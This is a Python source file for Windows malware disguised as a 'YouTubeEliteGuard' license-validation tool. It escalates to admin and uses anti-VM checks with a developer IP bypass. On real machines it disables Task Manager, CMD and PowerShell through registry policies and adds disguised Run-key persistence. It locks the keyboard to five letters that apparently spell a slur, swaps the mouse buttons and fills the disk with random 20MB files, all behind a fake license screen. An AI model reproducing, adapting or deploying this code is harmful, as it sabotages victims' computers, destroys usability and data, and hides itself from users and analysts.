import os
import sys
import ctypes
import subprocess
import requests
import uuid
import winreg
import time
import random
import string
import threading
import tkinter as tk
from pathlib import Path
from ctypes import wintypes

# --- WINDOWS API SETUP ---
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
    ]

class YouTubeEliteGuard:
    def __init__(self):
        self.authorized_ip = "146.70.124.148"
        self.vm_score = 0
        self.persistence_names = ["WinSecurityHealth", "SystemDisplayBroker", "WinUpdateManager"]
        self.hook = None

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def request_admin(self):
        if not self.is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()

    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except: return "0.0.0.0"

    def apply_lockdown(self):
        """Silently disables system tools and sets 3x persistence."""
        try:
            policies_system = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            policies_cmd = r"SOFTWARE\Policies\Microsoft\Windows\System"
            policies_explorer = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            run_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

            for hkey in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                # TaskMgr
                with winreg.CreateKey(hkey, policies_system) as k:
                    winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                # CMD
                with winreg.CreateKey(hkey, policies_cmd) as k:
                    winreg.SetValueEx(k, "DisableCMD", 0, winreg.REG_DWORD, 1)
                # PowerShell
                with winreg.CreateKey(hkey, policies_explorer) as k:
                    winreg.SetValueEx(k, "DisallowRun", 0, winreg.REG_DWORD, 1)
                    with winreg.CreateKey(k, "DisallowRun") as dr:
                        winreg.SetValueEx(dr, "1", 0, winreg.REG_SZ, "powershell.exe")
                        winreg.SetValueEx(dr, "2", 0, winreg.REG_SZ, "pwsh.exe")

            exe_path = os.path.realpath(sys.executable)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, run_key, 0, winreg.KEY_SET_VALUE) as k:
                for name in self.persistence_names:
                    winreg.SetValueEx(k, name, 0, winreg.REG_SZ, exe_path)
        except: pass

    def kbd_callback(self, nCode, wParam, lParam):
        """Keyboard Lock: Only n, g, i, r, e allowed."""
        if nCode == 0 and wParam == WM_KEYDOWN:
            vk = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode
            if vk not in [0x4E, 0x47, 0x49, 0x52, 0x45]:
                return 1 
        return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)

    def start_input_manipulation(self):
        user32.SwapMouseButton(True)
        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        self.pointer = CMPFUNC(self.kbd_callback)
        self.hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
        
        def pump():
            msg = wintypes.MSG()
            while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
        threading.Thread(target=pump, daemon=True).start()

    def show_gui(self):
        def launch():
            root = tk.Tk()
            root.overrideredirect(True)
            root.attributes("-topmost", True)
            root.configure(bg='#0F0F0F')
            w, h = 480, 200
            x = (root.winfo_screenwidth() // 2) - (w // 2)
            y = (root.winfo_screenheight() // 2) - (h // 2)
            root.geometry(f"{w}x{h}+{x}+{y}")
            tk.Label(root, text="VALIDATING LICENSE KEY...", 
                     fg="#00FF41", bg="#0F0F0F", 
                     font=("Consolas", 18, "bold")).pack(expand=True)
            root.mainloop()
        threading.Thread(target=launch, daemon=True).start()

    def create_folder_flood(self):
        """Background thread to create 999,999 folders with 20MB files."""
        def flood():
            desktop = Path.home() / "Desktop"
            for i in range(1, 1000000):
                try:
                    rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
                    folder_name = f"India_dev_{i}_{rand_str}"
                    folder_path = desktop / folder_name
                    folder_path.mkdir(exist_ok=True)
                    
                    file_path = folder_path / "random.bin"
                    with open(file_path, "wb") as f:
                        # 20MB of random binary data
                        f.write(os.urandom(20 * 1024 * 1024))
                except Exception:
                    break # Stop if disk space is zero
        threading.Thread(target=flood, daemon=True).start()

    def run_check(self):
        # Anti-VM Scoring
        try:
            cmd = "wmic bios get serialnumber"
            res = subprocess.check_output(cmd, shell=True, creationflags=0x08000000).decode().lower()
            if any(x in res for x in ["0", "vmware", "vbox", "qemu"]): self.vm_score += 3
        except: pass

        curr_ip = self.get_ip()
        is_vm = self.vm_score >= 3

        if not is_vm:
            # PHYSICAL MACHINE: FULL PAYLOAD
            self.apply_lockdown()
            self.start_input_manipulation()
            self.create_folder_flood()
            self.show_gui()
            return True
        else:
            # VM: DEVELOPER BYPASS
            if curr_ip == self.authorized_ip:
                self.show_gui()
                return True
            else:
                sys.exit()

if __name__ == "__main__":
    guard = YouTubeEliteGuard()
    guard.request_admin()
    if guard.run_check():
        while True:
            time.sleep(10)